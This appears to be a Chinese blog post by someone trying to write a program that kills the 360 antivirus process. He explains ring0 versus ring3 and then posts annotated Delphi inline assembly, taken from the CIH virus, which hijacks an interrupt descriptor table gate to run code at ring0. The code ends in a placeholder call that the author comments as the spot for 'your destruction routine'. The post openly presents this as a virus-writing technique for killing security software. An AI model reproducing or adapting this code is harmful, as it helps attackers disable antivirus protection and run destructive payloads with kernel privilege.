dbghelp.dll sysbol server
https://developer.microsoft.com/en-us/windows/hardware/windows-driver-kit


最近一直想写个程序干掉360，但是遇到了许多麻烦，即使权限提升，能干掉Winlogon.exe也干不掉360tray.exe，郁闷了半天。不知道360采用了什么诡异手段。后来找了找以前的比较牛X的病毒，一直到CIH病毒，才得到了一些启发。

　　首先说说ring0和ring3. 众所周知，windows 9X的win32在Intel X86 体系中只使用了处理器的三环保护模型中的零环（ring0，最高权限级别）和三环（ring3，最低权限级别），一般应用程序都运行在ring3下，只能调用系统提供的api，要想进行系统的底层操作，就只能进ring0了。

　　要想获取这种ring0权限，可以编写一个VxD（虚拟设备驱动程序），因为Vxd和系统运行在同一级别，但是到了windows NT/2000,Vxd已被Wdm取代，对于Wdm的编写，太难了，需要了解系统核心驱动模型。

　　但是在windows NT/2000下，也曾出现过超级用户获得ring0特权的代码，其中使用了“物理内存直接读写”，“线性地址映射为物理地址”等关键技术，但是跟踪研究发现，这些超级用户获取ring0特权的代码与操作系统密切相关，不具通用性。原因是微软的哥哥姐姐太可爱了，在windows NT/2000下，“线性地址映射为物理地址”的函数MmGetPhysicalAddress中的代码被多次更改，使得物理地址的计算不具有通用性。

　　扯远了，但是进入ring0是每个病毒编写者的终极目标，进入ring0意味着系统任由你摆布了，现在网上也介绍了许多进入ring0的办法，但都是c++写的，我一个搞Delphi的，望尘莫及呀。不禁感叹熊猫烧香的牛X和兵刃的牛逼，要想获得系统特权，好像编写驱动是最好的办法了，但是驱动不是我等小菜能开发的。最后参照风靡一时的CIH病毒，找到了进ring0的一种方法，就是在Delphi里内嵌汇编调用中断门进ring0，作者技术不是我能评价的，代码短小精悍，值得学习。贴出来借鉴吧，我做了注释。

procedure Ring0ToRun; stdcall;
const ExceptionUsed = $03; // 中断号,也可以用其他的中断号，如$05等

var

IDT:array [0..5] of byte; //保存中断描述符表，6字节

lpOldGate : DWORD; // 保存旧的中断向量，8个字节
begin
asm
sidt IDT //读入中断描述符表至IDt中
mov ebx, dword ptr [IDT+2] //IDT共6字节，第2~5字节是中断描述符表的基地址，基地址存入ebx中
add ebx, 8*ExceptionUsed //加上8x3个字节，因为每个中断向量占用8字节，
cli //关中断，下面的代码是关键代码，不允许打断
mov dx, word ptr [ebx+6] //取中断向量的6，7字节
shl edx, 16d //左移166位，中断向量的6，7字节存入edx的高32位
mov dx, word ptr [ebx] //取中断向量的0，1字节，存入edx低32位
mov [lpOldGate], edx //保存中断向量至lpoldgate中
mov eax, offset @@Ring0Code //修改向量，指向Ring0级代码段
mov word ptr [ebx], ax
shr eax, 16d
mov word ptr [ebx+6], ax
int ExceptionUsed // 发生中断，自动以ring0执行@@Ring0Code
mov ebx, dword ptr [IDT+2] //重新读出中断描述符表
add ebx, 8*ExceptionUsed
mov edx, [lpOldGate]
mov word ptr [ebx], dx
shr edx, 16d
mov word ptr [ebx+6], dx //恢复被改了的向量
ret
@@Ring0Code: //Ring0级代码段
push es
push ds
pushad
call SendCommand //这里调用你的破坏过程，无人可挡
popad
pop ds
pop es
iretd //中断返回
end;
end;